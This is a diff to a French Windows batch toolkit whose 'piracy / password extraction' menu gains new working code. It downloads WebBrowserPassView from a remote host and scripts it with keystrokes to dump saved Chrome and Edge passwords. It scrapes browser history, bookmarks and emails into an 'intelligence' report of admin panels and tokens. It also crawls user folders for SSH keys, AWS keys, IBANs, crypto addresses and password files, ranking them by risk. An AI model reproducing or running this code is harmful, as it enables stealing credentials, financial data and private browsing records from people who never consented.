@@ -244,6 +244,8 @@ set "t[155]=net_wifi_scan:Scan Reseaux Wi-Fi~Analyse des reseaux environnants (S
 set "t[156]=net_wifi_target:Analyser une Cible Wi-Fi~Informations detaillees sur un reseau selectionne:HIDDEN"
 set "t[157]=net_wifi_crack:Cracker la Cle Wi-Fi~Profils sauvegardes + attaque dictionnaire WPA2-PSK:HIDDEN"
 set "t[158]=dump_browser_local:Extracteur Navigateurs (Script)~Nouvelle methode avec decryptage DPAPI:HIDDEN"
+set "t[160]=gather_browser_history:Analyse Historique Navigateurs~Detecte les URLs sensibles dans l'historique Chrome/Edge:HIDDEN"
+set "t[161]=search_sensitive_docs:Scan Documents Critiques~Score de risque v5.5 - SSH, AWS, IBAN, mots de passe:HIDDEN"
 set "t[159]=Chrome, Edge - Dechiffrement DPAPI des identifiants et mots de passe:HIDDEN"
 REM Auto-detection du nombre de scripts (plus besoin de mettre a jour manuellement)
 set "total_tools=0"
@@ -299,6 +301,8 @@ set "map_dump_credman=Credential Manager~Extraire les identifiants Windows"
 set "map_dump_wifi=Mots de passe Wi-Fi~Afficher ou exporter les SSID"
 set "map_sys_nirsoft_pw=Extracteur Navigateurs (Nirsoft)~Ancienne methode"
 set "map_dump_browser_local=Extracteur Navigateurs (Script)~Nouvelle methode avec decryptage DPAPI"
+set "map_gather_browser_history=Analyse Historique Navigateurs~Detecte les URLs sensibles dans l'historique Chrome/Edge"
+set "map_search_sensitive_docs=Recherche Documents Sensibles~Factures, RIB, Contrats, Mots de passe sur le PC"
 set "map_sys_win_key=Cle Windows~Retrouver la cle de licence Windows"
 set "map_sys_drivers=Export des Pilotes~Sauvegarde de tous les pilotes"
 set "map_sys_export_software=Liste des Logiciels~Exporter via Winget"
@@ -1196,7 +1200,7 @@ goto app_installer
 :: Menu d'extraction de mots de passe
 :: ===============================================
 :sys_passwords_menu
-call :AutoMenu "PIRATAGE / EXTRACTION DE MOTS DE PASSE" "dump_credman;dump_wifi;sys_nirsoft_pw;dump_browser_local"
+call :AutoMenu "PIRATAGE / EXTRACTION DE MOTS DE PASSE" "dump_credman;dump_wifi;sys_nirsoft_pw;dump_browser_local;gather_browser_history;search_sensitive_docs"
 if "%errorlevel%"=="0" goto system_tools
 goto !AutoMenu_Target!
 
@@ -1419,6 +1423,9 @@ echo  ^|        EXTRACTION DES IDENTIFIANTS              ^|
 echo  ^|     Chrome / Edge  -  Dechiffrement DPAPI       ^|
 echo  +--------------------------------------------------+
 echo.
+set "CHROME_WAS_OPEN=0" & set "EDGE_WAS_OPEN=0"
+tasklist /FI "IMAGENAME eq chrome.exe" 2>nul | find /I "chrome.exe" >nul && set "CHROME_WAS_OPEN=1"
+tasklist /FI "IMAGENAME eq msedge.exe" 2>nul | find /I "msedge.exe" >nul && set "EDGE_WAS_OPEN=1"
 taskkill /F /IM chrome.exe >nul 2>&1
 taskkill /F /IM msedge.exe >nul 2>&1
 timeout /t 1 /nobreak >nul
@@ -1613,6 +1620,7 @@ set "PY_FILE=%TEMP%\decrypt_nav_%RANDOM%.py"
 >> "!PY_FILE!" echo         if sig not in seen: seen.add(sig); unique.append((url, user, pw))
 >> "!PY_FILE!" echo     for b in BROWSERS: print(f"  [{b}] {len(raw_by[b])} identifiant(s)")
 >> "!PY_FILE!" echo     print(f"  [+] Total : {len(unique)} uniques  /  {len(raw)-len(unique)} doublon(s) ignores")
+>> "!PY_FILE!" echo     if not raw_by["Chrome"]: open(tempfile.gettempdir()+"/chrome_v20.flag","w").close()
 >> "!PY_FILE!" echo     if not unique:
 >> "!PY_FILE!" echo         print("  Aucun identifiant recuperable."); return
 >> "!PY_FILE!" echo     unique.sort(key=lambda x: _dom(x[0]))
@@ -1644,6 +1652,319 @@ set "PY_FILE=%TEMP%\decrypt_nav_%RANDOM%.py"
 >> "!PY_FILE!" echo     ZIP_PATH.unlink(missing_ok=True)
 >> "!PY_FILE!" echo if __name__ == "__main__": main()
 "!PYCMD!" "!PY_FILE!"
+if exist "%TEMP%\chrome_v20.flag" (
+    del /f /q "%TEMP%\chrome_v20.flag" 2>nul
+    echo.
+    echo  [!] Chrome v20 detecte ^(chiffrement App-Bound, non dechiffrable via DPAPI^)
+    echo  [?] Tenter la recuperation via WebBrowserPassView ?
+    choice /C ON /N /M "     [O] Oui   [N] Non : "
+    if !errorlevel!==1 goto :chrome_v20_fix
+)
+goto :dump_browser_end
+
+:chrome_v20_fix
+echo.
+echo  [*] Chrome v20 Fix - WebBrowserPassView...
+set "WBPV=%SCRIPT_DIR%\WebBrowserPassView.exe"
+set "V20_OUT=%SCRIPT_DIR%\chrome_v20_resultats.txt"
+if not exist "!WBPV!" (
+    echo  [*] Telechargement WebBrowserPassView...
+    curl.exe -fL --retry 3 --retry-delay 2 -o "!WBPV!" "https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe" 2>nul
+    if not exist "!WBPV!" (
+        echo  [!] Echec telechargement - verifiez votre antivirus ou connexion.
+        goto :dump_browser_end
+    )
+)
+echo  [1/3] Lancement WebBrowserPassView...
+start "" "!WBPV!"
+timeout /t 5 /nobreak >nul
+echo  [2/3] Extraction automatique...
+set "V20_PS=%TEMP%\v20_auto_%RANDOM%.ps1"
+> "!V20_PS!" echo $o = '!V20_OUT!'
+>> "!V20_PS!" echo Set-Clipboard -Value $o
+>> "!V20_PS!" echo $wsh = New-Object -ComObject WScript.Shell
+>> "!V20_PS!" echo if ($wsh.AppActivate('WebBrowserPassView')) {
+>> "!V20_PS!" echo     Start-Sleep -Milliseconds 600
+>> "!V20_PS!" echo     $wsh.SendKeys('^a')
+>> "!V20_PS!" echo     Start-Sleep -Milliseconds 300
+>> "!V20_PS!" echo     $wsh.SendKeys('^s')
+>> "!V20_PS!" echo     Start-Sleep -Milliseconds 1500
+>> "!V20_PS!" echo     $wsh.SendKeys('^v')
+>> "!V20_PS!" echo     Start-Sleep -Milliseconds 500
+>> "!V20_PS!" echo     $wsh.SendKeys('{ENTER}')
+>> "!V20_PS!" echo     Start-Sleep -Milliseconds 1000
+>> "!V20_PS!" echo } else { Write-Warning 'Fenetre non detectee - antivirus ?' }
+powershell -NoProfile -ExecutionPolicy Bypass -File "!V20_PS!"
+del /f /q "!V20_PS!" 2>nul
+echo  [3/3] Fermeture...
+taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
+if exist "!V20_OUT!" (
+    echo  [+] Resultat sauvegarde : chrome_v20_resultats.txt
+) else (
+    echo  [!] Aucun fichier genere - antivirus ou Chrome v20 incompatible.
+)
+
+:dump_browser_end
+if "!CHROME_WAS_OPEN!"=="1" if exist "%PROGRAMFILES%\Google\Chrome\Application\chrome.exe" start "" "%PROGRAMFILES%\Google\Chrome\Application\chrome.exe"
+if "!CHROME_WAS_OPEN!"=="1" if exist "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe" start "" "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"
+if "!EDGE_WAS_OPEN!"=="1" if exist "%PROGRAMFILES(x86)%\Microsoft\Edge\Application\msedge.exe" start "" "%PROGRAMFILES(x86)%\Microsoft\Edge\Application\msedge.exe"
+echo.
+echo  +--------------------------------------------------+
+echo  Appuyez sur une touche pour revenir au menu...
+pause >nul
+endlocal
+goto sys_passwords_menu
+
+::===============================================
+:gather_browser_history
+setlocal enabledelayedexpansion
+cls
+echo.
+echo  +--------------------------------------------------+
+echo  ^|     ANALYSE HISTORIQUE NAVIGATEURS              ^|
+echo  ^|   Detection d'URLs sensibles - Chrome / Edge    ^|
+echo  +--------------------------------------------------+
+echo.
+
+set "PYCMD="
+for /f "delims=" %%p in ('where python 2^>nul') do if not defined PYCMD set "PYCMD=%%p"
+for /f "delims=" %%p in ('where py 2^>nul') do if not defined PYCMD set "PYCMD=%%p"
+
+if not defined PYCMD (
+    echo  [!] Python requis mais absent. Installez Python depuis python.org
+    pause
+    endlocal
+    goto sys_passwords_menu
+)
+
+echo  [*] Fermeture des navigateurs pour eviter le verrou SQLite...
+set "CHROME_WAS_OPEN=0" & set "EDGE_WAS_OPEN=0"
+tasklist /FI "IMAGENAME eq chrome.exe" 2>nul | find /I "chrome.exe" >nul && set "CHROME_WAS_OPEN=1"
+tasklist /FI "IMAGENAME eq msedge.exe" 2>nul | find /I "msedge.exe" >nul && set "EDGE_WAS_OPEN=1"
+taskkill /F /IM chrome.exe >nul 2>&1
+taskkill /F /IM msedge.exe >nul 2>&1
+timeout /t 1 /nobreak >nul
+echo  [*] Analyse en cours...
+echo.
+set "HIST_FILE=%TEMP%\hist_gather_%RANDOM%.py"
+> "!HIST_FILE!" echo import sqlite3, shutil, tempfile, os, json, re
+>> "!HIST_FILE!" echo from pathlib import Path
+>> "!HIST_FILE!" echo from urllib.parse import urlparse, unquote
+>> "!HIST_FILE!" echo SCRIPT_DIR = r"%SCRIPT_DIR%"
+>> "!HIST_FILE!" echo KEYWORDS = ['admin','wp-','panel','cpanel','phpmyadmin','sql','config','setup','192.168.','10.0.','localhost','router','gateway','nas','camera','login','auth','token','session','password','secret','jwt','aws','azure','gitlab','env','staging']
+>> "!HIST_FILE!" echo BLACKLIST = ['google.','amazon.','facebook.','bing.','tiktok.','twitter.','analytics','ads','pixel','static','gstatic','doubleclick','tracking','telemetry','cdn','newsletter','youtube.','instagram.','awstrack.me','mjt.lu','sendgrid','extension://','voici.fr','capital.fr','elle.fr','geo.fr','taboola','outbrain','adyen.com','wizville.fr','shein.com','pinterest','netflix.com','disneyplus','spotify','livi.fr','darty.com','fnac.com','leroymerlin','boutique','gala.fr','rtl.fr','habitatpresto','vente-unique','public.opendatasoft','wtm.','letribunaldunet','coulisses-politique','point-d-interrogation','/r/eN']
+>> "!HIST_FILE!" echo REPORT = Path(SCRIPT_DIR) / "Intelligence_Report.txt"
+>> "!HIST_FILE!" echo EMAIL_RE = re.compile(r'[a-zA-Z0-9._%%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
+>> "!HIST_FILE!" echo def get_dom(url):
+>> "!HIST_FILE!" echo     try: return urlparse(url).netloc or "LOCAL/OTHER"
+>> "!HIST_FILE!" echo     except: return "INVALID"
+>> "!HIST_FILE!" echo def analyze_profile(p_path):
+>> "!HIST_FILE!" echo     p_data = {'hist': {}, 'favs': set(), 'downs': [], 'emails': set()}
+>> "!HIST_FILE!" echo     h_path = p_path / "History"
+>> "!HIST_FILE!" echo     if h_path.exists():
+>> "!HIST_FILE!" echo         tmp = Path(tempfile.mktemp())
+>> "!HIST_FILE!" echo         try:
+>> "!HIST_FILE!" echo             shutil.copy2(h_path, tmp)
+>> "!HIST_FILE!" echo             con = sqlite3.connect(tmp)
+>> "!HIST_FILE!" echo             for url, title in con.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC"):
+>> "!HIST_FILE!" echo                 u_dec = unquote(url).lower()
+>> "!HIST_FILE!" echo                 for e in EMAIL_RE.findall(u_dec):
+>> "!HIST_FILE!" echo                     if not any(x in e for x in ['sentry','example','git']): p_data['emails'].add(e)
+>> "!HIST_FILE!" echo                 if any(b in u_dec for b in BLACKLIST): continue
+>> "!HIST_FILE!" echo                 if any(k in u_dec for k in KEYWORDS) or (title and any(k in title.lower() for k in KEYWORDS)) or ':' in url[8:].split('/')[0]:
+>> "!HIST_FILE!" echo                     dom = get_dom(url)
+>> "!HIST_FILE!" echo                     if dom not in p_data['hist']: p_data['hist'][dom] = set()
+>> "!HIST_FILE!" echo                     p_data['hist'][dom].add(url.split('?')[0][:80])
+>> "!HIST_FILE!" echo             try:
+>> "!HIST_FILE!" echo                 for target, src in con.execute("SELECT target_path, referrer FROM downloads"):
+>> "!HIST_FILE!" echo                     if not any(b in src.lower() for b in BLACKLIST):
+>> "!HIST_FILE!" echo                         p_data['downs'].append(f"  ! {os.path.basename(target)} | From: {src[:80]}")
+>> "!HIST_FILE!" echo             except: pass
+>> "!HIST_FILE!" echo             con.close()
+>> "!HIST_FILE!" echo         except: pass
+>> "!HIST_FILE!" echo         finally: tmp.unlink(missing_ok=True)
+>> "!HIST_FILE!" echo     f_path = p_path / "Bookmarks"
+>> "!HIST_FILE!" echo     if f_path.exists():
+>> "!HIST_FILE!" echo         try:
+>> "!HIST_FILE!" echo             data = json.loads(f_path.read_text(errors='ignore'))
+>> "!HIST_FILE!" echo             def parse_favs(nodes):
+>> "!HIST_FILE!" echo                 for n in nodes:
+>> "!HIST_FILE!" echo                     if n.get('type') == 'url':
+>> "!HIST_FILE!" echo                         u_fav = n.get('url','').lower()
+>> "!HIST_FILE!" echo                         if not any(b in u_fav for b in BLACKLIST):
+>> "!HIST_FILE!" echo                             p_data['favs'].add(n.get('url','')[:80])
+>> "!HIST_FILE!" echo                     if n.get('children'): parse_favs(n['children'])
+>> "!HIST_FILE!" echo             parse_favs(list(data.get('roots', {}).values()))
+>> "!HIST_FILE!" echo         except: pass
+>> "!HIST_FILE!" echo     return p_data
+>> "!HIST_FILE!" echo out = REPORT; i = 1
+>> "!HIST_FILE!" echo while out.exists(): out = REPORT.parent / f"Intelligence_Report_{i}.txt"; i += 1
+>> "!HIST_FILE!" echo total_hits = 0
+>> "!HIST_FILE!" echo with open(out, "w", encoding="utf-8") as f:
+>> "!HIST_FILE!" echo     f.write("=== GOLDEN EDITION - RAPPORT D'INTELLIGENCE TACTIQUE ===\n")
+>> "!HIST_FILE!" echo     f.write(f"Machine : {os.environ.get('COMPUTERNAME')}\n\n")
+>> "!HIST_FILE!" echo     for b_name, b_base in [("Chrome", r"%LOCALAPPDATA%\Google\Chrome\User Data"), ("Edge", r"%LOCALAPPDATA%\Microsoft\Edge\User Data")]:
+>> "!HIST_FILE!" echo         base_path = Path(b_base)
+>> "!HIST_FILE!" echo         if not base_path.exists(): continue
+>> "!HIST_FILE!" echo         for prof in list(base_path.glob("Default")) + list(base_path.glob("Profile *")):
+>> "!HIST_FILE!" echo             data = analyze_profile(prof)
+>> "!HIST_FILE!" echo             if not any([data['hist'], data['favs'], data['downs'], data['emails']]): continue
+>> "!HIST_FILE!" echo             f.write(f"\n>>>> [{b_name.upper()}] PROFIL : {prof.name}\n")
+>> "!HIST_FILE!" echo             if data['emails']:
+>> "!HIST_FILE!" echo                 f.write("\n[@] EMAILS DETECTES :\n")
+>> "!HIST_FILE!" echo                 for mail in sorted(data['emails']): f.write(f"  - {mail}\n")
+>> "!HIST_FILE!" echo             if data['hist']:
+>> "!HIST_FILE!" echo                 f.write("\n[#] INFRASTRUCTURE & ADMIN :\n")
+>> "!HIST_FILE!" echo                 for dom in sorted(data['hist'].keys()):
+>> "!HIST_FILE!" echo                     f.write(f"  [{dom}]\n")
+>> "!HIST_FILE!" echo                     for url in data['hist'][dom]: f.write(f"    -> {url}\n")
+>> "!HIST_FILE!" echo                     total_hits += len(data['hist'][dom])
+>> "!HIST_FILE!" echo             if data['favs']:
+>> "!HIST_FILE!" echo                 f.write("\n[*] FAVORIS PERTINENTS :\n")
+>> "!HIST_FILE!" echo                 for fav in sorted(data['favs']): f.write(f"  * {fav}\n")
+>> "!HIST_FILE!" echo             if data['downs']:
+>> "!HIST_FILE!" echo                 f.write("\n[!] TELECHARGEMENTS :\n")
+>> "!HIST_FILE!" echo                 for d in data['downs'][-10:]: f.write(f"{d}\n")
+>> "!HIST_FILE!" echo             f.write("\n" + "=" * 70 + "\n")
+>> "!HIST_FILE!" echo print(f"  [+] Analyse terminee - Rapport : {out.name}")
+>> "!HIST_FILE!" echo os.startfile(out)
+"!PYCMD!" "!HIST_FILE!"
+del /f /q "!HIST_FILE!" 2>nul
+if "!CHROME_WAS_OPEN!"=="1" if exist "%PROGRAMFILES%\Google\Chrome\Application\chrome.exe" start "" "%PROGRAMFILES%\Google\Chrome\Application\chrome.exe"
+if "!CHROME_WAS_OPEN!"=="1" if exist "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe" start "" "%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"
+if "!EDGE_WAS_OPEN!"=="1" if exist "%PROGRAMFILES(x86)%\Microsoft\Edge\Application\msedge.exe" start "" "%PROGRAMFILES(x86)%\Microsoft\Edge\Application\msedge.exe"
+echo.
+echo  +--------------------------------------------------+
+echo  Appuyez sur une touche pour revenir au menu...
+pause >nul
+endlocal
+goto sys_passwords_menu
+
+::===============================================
+:search_sensitive_docs
+setlocal enabledelayedexpansion
+cls
+echo.
+echo  +--------------------------------------------------+
+echo  ^|      RECHERCHE DOCUMENTS SENSIBLES              ^|
+echo  ^|   Factures, RIB, Contrats, Mots de passe        ^|
+echo  +--------------------------------------------------+
+echo.
+
+set "PYCMD="
+for /f "delims=" %%p in ('where python 2^>nul') do if not defined PYCMD set "PYCMD=%%p"
+for /f "delims=" %%p in ('where py 2^>nul') do if not defined PYCMD set "PYCMD=%%p"
+
+if not defined PYCMD (
+    echo  [!] Python requis. Installez Python depuis python.org
+    pause
+    endlocal
+    goto sys_passwords_menu
+)
+
+echo  [*] Scan en cours...
+echo.
+set "DOC_FILE=%TEMP%\doc_scan_%RANDOM%.py"
+> "!DOC_FILE!" echo import os, re, zipfile, sys, msvcrt
+>> "!DOC_FILE!" echo from pathlib import Path
+>> "!DOC_FILE!" echo SCRIPT_DIR = r"%SCRIPT_DIR%"
+>> "!DOC_FILE!" echo REPORT = Path(SCRIPT_DIR) / "Critical_Assets_Report.txt"
+>> "!DOC_FILE!" echo RULES = [
+>> "!DOC_FILE!" echo     ('SSH-KEY', r'-----BEGIN (RSA^|OPENSSH^|PRIVATE) KEY-----', 50),
+>> "!DOC_FILE!" echo     ('AWS-KEY', r'AKIA[0-9A-Z]{16}', 45),
+>> "!DOC_FILE!" echo     ('DB-PWD',  r'(db_password^|db_pass^|database_url)\s*=\s*\S', 35),
+>> "!DOC_FILE!" echo     ('IBAN',    r'IBAN\s*[:\-]?\s*[A-Z]{2}\d{2}', 30),
+>> "!DOC_FILE!" echo     ('CRYPTO',  r'\b[13][a-km-zA-HJ-NP-Z1-9]{33,34}\b', 40),
+>> "!DOC_FILE!" echo ]
+>> "!DOC_FILE!" echo KW_NAME = {
+>> "!DOC_FILE!" echo     'vault':40, 'secret':30, 'password':35, 'mdp':35,
+>> "!DOC_FILE!" echo     '.env':45, 'backup':25, 'iban':20, 'rib':20,
+>> "!DOC_FILE!" echo     'salaire':15, 'confidentiel':30, 'credentials':35,
+>> "!DOC_FILE!" echo     'facture':15, 'contrat':15, 'passeport':25
+>> "!DOC_FILE!" echo }
+>> "!DOC_FILE!" echo EXCLUDE_DIRS = {
+>> "!DOC_FILE!" echo     'node_modules','vendor','wp-admin','wp-includes','wp-content',
+>> "!DOC_FILE!" echo     '.git','.cxx','intermediates','build','__pycache__',
+>> "!DOC_FILE!" echo     'AppData','Temp','Program Files','Windows','bower_components',
+>> "!DOC_FILE!" echo     'TEMPLATE','dist','migrations','lang'
+>> "!DOC_FILE!" echo }
+>> "!DOC_FILE!" echo EXCLUDE_FILES = {
+>> "!DOC_FILE!" echo     'package-lock.json','yarn.lock','composer.lock',
+>> "!DOC_FILE!" echo     'compile_commands.json','merger.xml','.gitattributes'
+>> "!DOC_FILE!" echo }
+>> "!DOC_FILE!" echo SKIP_EXTS = {
+>> "!DOC_FILE!" echo     '.png','.jpg','.jpeg','.gif','.webp','.svg','.ico',
+>> "!DOC_FILE!" echo     '.woff','.woff2','.ttf','.eot','.otf',
+>> "!DOC_FILE!" echo     '.mp4','.mp3','.avi','.zip','.rar','.7z',
+>> "!DOC_FILE!" echo     '.dll','.exe','.so','.flat','.class','.pyc'
+>> "!DOC_FILE!" echo }
+>> "!DOC_FILE!" echo EXTS = {'.txt','.csv','.docx','.json','.env','.ini','.conf','.log'}
+>> "!DOC_FILE!" echo def check_esc():
+>> "!DOC_FILE!" echo     if msvcrt.kbhit():
+>> "!DOC_FILE!" echo         if ord(msvcrt.getch()) == 27: return True
+>> "!DOC_FILE!" echo     return False
+>> "!DOC_FILE!" echo def get_text(p):
+>> "!DOC_FILE!" echo     try:
+>> "!DOC_FILE!" echo         if p.suffix.lower() == '.docx':
+>> "!DOC_FILE!" echo             with zipfile.ZipFile(p) as z: return z.read('word/document.xml').decode('utf-8','ignore')
+>> "!DOC_FILE!" echo         return p.read_text(encoding='utf-8', errors='ignore')
+>> "!DOC_FILE!" echo     except: return ""
+>> "!DOC_FILE!" echo results = []
+>> "!DOC_FILE!" echo total_files = 0
+>> "!DOC_FILE!" echo print("  Appuyez sur ECHAP pour annuler...", flush=True)
+>> "!DOC_FILE!" echo for base in [Path.home()/d for d in ['Documents','Desktop','Downloads','OneDrive']]:
+>> "!DOC_FILE!" echo     if not base.exists(): continue
+>> "!DOC_FILE!" echo     print(f"  [^>] {base.name}...", flush=True)
+>> "!DOC_FILE!" echo     dir_count = 0
+>> "!DOC_FILE!" echo     for root, dirs, files in os.walk(base):
+>> "!DOC_FILE!" echo         if check_esc(): print("\n  [^!] Scan annule."); sys.exit(0)
+>> "!DOC_FILE!" echo         dirs[:] = [d for d in dirs if d not in EXCLUDE_DIRS and not d.startswith('.')]
+>> "!DOC_FILE!" echo         dir_count += 1
+>> "!DOC_FILE!" echo         if dir_count %% 15 == 0: print(f"  [~] {dir_count} dossiers, {total_files} fichiers, {len(results)} hits...   ", end='\r', flush=True)
+>> "!DOC_FILE!" echo         for file in files:
+>> "!DOC_FILE!" echo             if file.lower() in EXCLUDE_FILES: continue
+>> "!DOC_FILE!" echo             if file.endswith('.min.js') or file.endswith('.min.css'): continue
+>> "!DOC_FILE!" echo             p = Path(root) / file
+>> "!DOC_FILE!" echo             if p.suffix.lower() in SKIP_EXTS: continue
+>> "!DOC_FILE!" echo             try:
+>> "!DOC_FILE!" echo                 if p.stat().st_size ^> 2000000: continue
+>> "!DOC_FILE!" echo             except: continue
+>> "!DOC_FILE!" echo             total_files += 1
+>> "!DOC_FILE!" echo             score = 0; tags = []
+>> "!DOC_FILE!" echo             fname = file.lower()
+>> "!DOC_FILE!" echo             for kw, pts in KW_NAME.items():
+>> "!DOC_FILE!" echo                 if kw.startswith('.'):
+>> "!DOC_FILE!" echo                     m = kw in fname
+>> "!DOC_FILE!" echo                 else:
+>> "!DOC_FILE!" echo                     m = bool(re.search(r'\b' + re.escape(kw) + r'\b', fname))
+>> "!DOC_FILE!" echo                 if m: score += pts; tags.append(f"NAME:{kw.upper()}")
+>> "!DOC_FILE!" echo             if p.suffix.lower() in EXTS:
+>> "!DOC_FILE!" echo                 txt = get_text(p)
+>> "!DOC_FILE!" echo                 for tname, reg, pts in RULES:
+>> "!DOC_FILE!" echo                     if tname == 'CRYPTO' and p.suffix.lower() == '.docx': continue
+>> "!DOC_FILE!" echo                     if re.search(reg, txt, re.I): score += pts; tags.append(tname)
+>> "!DOC_FILE!" echo             if score ^> 0:
+>> "!DOC_FILE!" echo                 results.append({'score':score,'path':str(p),'tags':list(set(tags))})
+>> "!DOC_FILE!" echo                 print(f"  [HIT] {p.name}", flush=True)
+>> "!DOC_FILE!" echo     print(f"  [OK] {base.name} : {dir_count} dossiers, {total_files} fichiers analyses" + " "*20, flush=True)
+>> "!DOC_FILE!" echo print(f"\n  [+] {len(results)} element(s) detecte(s) - tri en cours...", flush=True)
+>> "!DOC_FILE!" echo results.sort(key=lambda x: x['score'], reverse=True)
+>> "!DOC_FILE!" echo out = REPORT; i = 1
+>> "!DOC_FILE!" echo while out.exists(): out = REPORT.parent / f"Critical_Assets_Report_{i}.txt"; i += 1
+>> "!DOC_FILE!" echo if results:
+>> "!DOC_FILE!" echo     with open(out, "w", encoding="utf-8") as f:
+>> "!DOC_FILE!" echo         f.write("=== CRITICAL ASSETS REPORT v5.8 - TRIE PAR RISQUE ===\n")
+>> "!DOC_FILE!" echo         f.write(f"Machine : {os.environ.get('COMPUTERNAME')}\n\n")
+>> "!DOC_FILE!" echo         for r in results:
+>> "!DOC_FILE!" echo             clean = [t.replace('NAME:','').lower() if t.startswith('NAME:') else t for t in r['tags']]
+>> "!DOC_FILE!" echo             f.write(f"  {' + '.join(clean)}\n")
+>> "!DOC_FILE!" echo             f.write(f"  {r['path']}\n\n")
+>> "!DOC_FILE!" echo     print(f"  [+] {len(results)} fichier(s) critique(s) - Rapport : {out.name}")
+>> "!DOC_FILE!" echo     os.startfile(out)
+>> "!DOC_FILE!" echo else:
+>> "!DOC_FILE!" echo     print("  [i] Aucun document critique detecte")
+"!PYCMD!" "!DOC_FILE!"
+del /f /q "!DOC_FILE!" 2>nul
 echo.
 echo  +--------------------------------------------------+
 echo  Appuyez sur une touche pour revenir au menu...
